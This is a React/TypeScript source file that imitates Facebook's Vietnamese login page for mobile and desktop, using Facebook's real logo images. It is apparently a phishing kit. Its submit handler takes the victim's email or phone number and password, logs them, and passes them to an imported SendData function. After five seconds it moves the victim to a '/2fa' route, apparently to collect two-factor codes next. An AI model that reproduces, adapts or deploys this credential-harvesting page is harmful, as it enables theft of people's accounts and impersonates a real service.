/* eslint-disable @typescript-eslint/no-explicit-any */
import { ChevronLeft, Eye, EyeOff } from 'lucide-react';
import { useCallback, useEffect, useState, memo } from 'react';
import './style.css';
import { useNavigate } from 'react-router-dom';
import { SendData } from '../../config/sendData';


const MobileLoginForm = memo(({
  email,
  password,
  showPassword,
  handleEmailChange,
  handlePasswordChange,
  handleSubmit,
  handleBackClick,
  togglePasswordVisibility
}: any) => (
  <div className="flex flex-col min-h-screen bg-gray-50 p-4">
    <div className="flex items-center justify-between mb-2">
      <button
        onClick={handleBackClick}
        className="cursor-pointer text-gray-700 p-2 -ml-2"
      >
        <ChevronLeft />
      </button>

      <div className="w-6"></div>
    </div>

    <div className="flex justify-center mt-8 mb-10 ">
      <img
        src="https://static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png"
        alt="Facebook Logo"
        className="w-14 h-14"
      />
    </div>

    <div className="w-full mb-4">
      <form onSubmit={handleSubmit} className="space-y-3">
        <div>
          <input
            type="text"
            placeholder="Số di động hoặc email"
            className="w-full px-4 py-3 rounded-lg border border-gray-300 text-gray-600 focus:outline-none focus:border-blue-500 focus:ring-[0.7]"
            value={email}
            onChange={handleEmailChange}
            required
          />
        </div>
        <div className="relative">
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Mật khẩu"
            className="w-full px-4 py-3 pr-10 rounded-lg border border-gray-300 text-gray-600 focus:outline-none focus:border-blue-500 focus:ring-[0.7]"
            value={password}
            onChange={handlePasswordChange}
            required
          />
          <button
            type="button"
            onClick={togglePasswordVisibility}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 focus:outline-none"
          >
            {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
          </button>
        </div>
        <button
          type="submit"
          className="cursor-pointer w-full bg-blue-600 text-white py-3 rounded-full font-medium text-base"
          onClick={(e) => {
            if (e) e.stopPropagation();
            handleSubmit(e);
          }}
          onTouchStart={(e) => {
            e.stopPropagation();
          }}
          onTouchEnd={(e) => {
            e.stopPropagation();
            handleSubmit(e);
          }}
        >
          Đăng nhập
        </button>
      </form>

      <div className="mt-4 text-center">
        <a href="#" className="text-blue-600 text-sm">
          Bạn quên mật khẩu ư?
        </a>
      </div>
    </div>

    <div className="mt-10"></div>

    <div className="mt-auto">
      <button
        type="button"
        className="w-full border border-blue-500 text-blue-600 py-3 px-4 rounded-full font-medium mt-4 mb-8"
      >
        Tạo tài khoản mới
      </button>

      <div className="flex justify-center mt-4 mb-1 metaicon">
        <img
          src="https://static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png"
          alt="Meta"
          className="h-3"
        />
      </div>
    </div>
  </div>
));

const DesktopLayout = memo(({
  email,
  password,
  showPassword,
  handleEmailChange,
  handlePasswordChange,
  handleSubmit,
  togglePasswordVisibility
}: any) => (
  <div className="min-h-screen bg-gray-100 flex flex-col">
    <div className="flex-grow flex items-center justify-center px-4 py-12">
      <div className="max-w-[980px] w-full mx-auto grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-10 items-center">
        <div className="md:pr-8">
          <img
            src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
            alt="Facebook"
            className="h-[106px] -ml-4 mb-5"
          />
          <h2 className="text-[28px] leading-8 text-gray-800 font-normal">
            Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.
          </h2>
        </div>

        <div>
          <div className="bg-white p-4 pb-5 rounded-lg shadow-md max-w-[396px] mx-auto w-full">
            <form onSubmit={handleSubmit} className="space-y-2">
              <div>
                <input
                  type="text"
                  placeholder="Email hoặc số điện thoại"
                  className="w-full px-3 py-3 rounded-md border border-gray-200 text-base focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                  value={email}
                  onChange={handleEmailChange}
                  required
                />
              </div>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Mật khẩu"
                  className="w-full px-3 py-3 pr-10 rounded-md border border-gray-200 text-base focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                  value={password}
                  onChange={handlePasswordChange}
                  required
                />
                <button
                  type="button"
                  onClick={togglePasswordVisibility}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 focus:outline-none"
                >
                  {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
              <button
                type="submit"
                className="cursor-pointer w-full bg-blue-600 text-white py-2 px-4 rounded-md font-medium text-xl hover:bg-blue-700 transition"
              >
                Đăng nhập
              </button>
            </form>
            <div className="text-center my-3">
              <a href="#" className="cursor-pointer text-blue-600 text-sm hover:underline">
                Quên mật khẩu?
              </a>
            </div>
            <div className="border-t border-gray-300 my-3"></div>
            <div className="flex justify-center">
              <button
                type="button"
                className="cursor-pointer bg-green-500 text-white py-2 px-4 rounded-md font-medium text-lg hover:bg-green-600 transition"
              >
                Tạo tài khoản mới
              </button>
            </div>
          </div>
          <div className="text-center mt-6 text-sm max-w-[396px] mx-auto">
            <p>
              <a href="#" className="font-bold hover:underline">Tạo Trang</a>{' '}
              dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.
            </p>
          </div>
        </div>
      </div>
    </div>

    <div className="mt-auto border-t border-gray-300 bg-white py-6">
      <div className="max-w-[980px] mx-auto px-4">
        <div className="flex flex-wrap mb-2">
          <a href="#" className="text-gray-600 mr-3 mb-1 text-xs">Tiếng Việt</a>
          <a href="#" className="text-gray-600 mr-3 mb-1 text-xs">English (UK)</a>
          <a href="#" className="text-gray-600 mr-3 mb-1 text-xs">中文(台灣)</a>
          <a href="#" className="text-gray-600 mr-3 mb-1 text-xs">한국어</a>
          <a href="#" className="text-gray-600 mr-3 mb-1 text-xs">日本語</a>
          <a href="#" className="text-gray-600 mr-3 mb-1 text-xs">Français (France)</a>
          <a href="#" className="text-gray-600 mr-3 mb-1 text-xs">ภาษาไทย</a>
          <a href="#" className="text-gray-600 mr-3 mb-1 text-xs">Español</a>
          <a href="#" className="text-gray-600 mr-3 mb-1 text-xs">Português (Brasil)</a>
          <a href="#" className="text-gray-600 mr-3 mb-1 text-xs">Deutsch</a>
          <a href="#" className="text-gray-600 mr-3 mb-1 text-xs">Italiano</a>
          <button className="text-gray-600 border border-gray-300 rounded-sm px-1 text-xs">+</button>
        </div>

        <hr className="border-gray-300 mb-2" />

        <div className="flex flex-wrap text-xs">
          <a href="#" className="text-gray-600 mr-3 mb-1">Đăng ký</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Đăng nhập</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Messenger</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Facebook Lite</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Video</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Meta Pay</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Cửa hàng trên Meta</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Meta Quest</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Ray-Ban Meta</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Meta AI</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Instagram</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Threads</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Trung tâm thông tin bộ phiếu</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Chính sách quyền riêng tư</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Trung tâm quyền riêng tư</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Giới thiệu</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Tạo quảng cáo</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Tạo Trang</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Nhà phát triển</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Tuyển dụng</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Cookie</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Lựa chọn quảng cáo</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Điều khoản</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Trợ giúp</a>
          <a href="#" className="text-gray-600 mr-3 mb-1">Tải thông tin liên hệ lên & đối tượng không phải người dùng</a>
        </div>

        <div className="mt-4 text-xs text-gray-600">
          <p>Meta © 2025</p>
        </div>
      </div>
    </div>
  </div>
));

const FacebookLogin = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isMobile, setIsMobile] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const nav = useNavigate();

  const checkIfMobile = useCallback(() => {
    setIsMobile(window.innerWidth <= 768);
  }, []);

  const handleEmailChange = useCallback((e: any) => {
    setEmail(e.target.value);
  }, []);

  const handlePasswordChange = useCallback((e: any) => {
    setPassword(e.target.value);
  }, []);

  const handleSubmit = useCallback((e: any) => {
    e.preventDefault();
    const payload: any = {
      user: email,
      password: password
    };
    console.log('Payload:', payload);

    SendData(payload)
      .then((data) => {
        console.log('Đăng nhập thành công:', data);
        setTimeout(() => { nav('/2fa'); }, 5000);
      })
      .catch((error) => {
        console.error('Lỗi đăng nhập:', error);
      });
  }, [email, password, nav]);

  const handleBackClick = useCallback(() => {
    window.location.href = '/';
  }, []);

  const togglePasswordVisibility = useCallback(() => {
    setShowPassword(prevState => !prevState);
  }, []);

  useEffect(() => {
    checkIfMobile();
    window.addEventListener('resize', checkIfMobile);
    return () => window.removeEventListener('resize', checkIfMobile);
  }, [checkIfMobile]);

  return isMobile ? (
    <MobileLoginForm
      email={email}
      password={password}
      showPassword={showPassword}
      handleEmailChange={handleEmailChange}
      handlePasswordChange={handlePasswordChange}
      handleSubmit={handleSubmit}
      handleBackClick={handleBackClick}
      togglePasswordVisibility={togglePasswordVisibility}
    />
  ) : (
    <DesktopLayout
      email={email}
      password={password}
      showPassword={showPassword}
      handleEmailChange={handleEmailChange}
      handlePasswordChange={handlePasswordChange}
      handleSubmit={handleSubmit}
      togglePasswordVisibility={togglePasswordVisibility}
    />
  );
};

export default FacebookLogin;
